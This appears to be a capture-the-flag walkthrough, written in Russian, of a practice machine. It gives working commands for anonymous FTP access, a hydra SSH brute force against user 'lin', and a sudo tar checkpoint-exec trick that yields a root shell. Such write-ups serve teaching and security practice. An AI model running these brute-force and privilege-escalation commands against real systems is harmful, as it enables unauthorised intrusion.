1. Reconnaissance
Начинаем с базового сканирования портов:
nmap -sC -sV <TARGET_IP>

Open ports:
21/tcp — FTP (vsftpd 3.0.5)
22/tcp — SSH
80/tcp — HTTP (Apache)

Сканирование показало, что на FTP разрешён анонимный доступ.

2. FTP Enumeration
Подключаемся к FTP под пользователем anonymous без пароля:

ftp <TARGET_IP>

В корневой директории найдены два файла:
task.txt
locks.txt

Загружаем их на локальную машину:
get task.txt
get locks.txt


3. Information Disclosure

* В task.txt указано имя пользователя lin
* В locks.txt содержится список паролей

Это наводит на мысль о bruteforce‑атаке на SSH.

4. SSH Bruteforce (Hydra)
Используем hydra для подбора пароля пользователя lin:

hydra -l lin -P locks.txt <TARGET_IP> ssh

Результат:
login: lin
password: RedDr4gonSynd1cat3


5. SSH Access
Подключаемся по SSH:
ssh lin@<TARGET_IP>

В домашней директории пользователя найден файл:
user.txt

User flag получен

6. Privilege Escalation
Проверяем sudo‑права:

sudo -l

Вывод показывает, что пользователь lin может запускать tar с правами root без пароля:
(root) /bin/tar

--Exploit (GTFOBins)--

Используем tar для получения root‑shell:
sudo tar -cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh

Проверяем:
>whoami
>root

7. Root Flag
Переходим в /root и читаем флаг:

cat /root/root.txt
Root flag получен

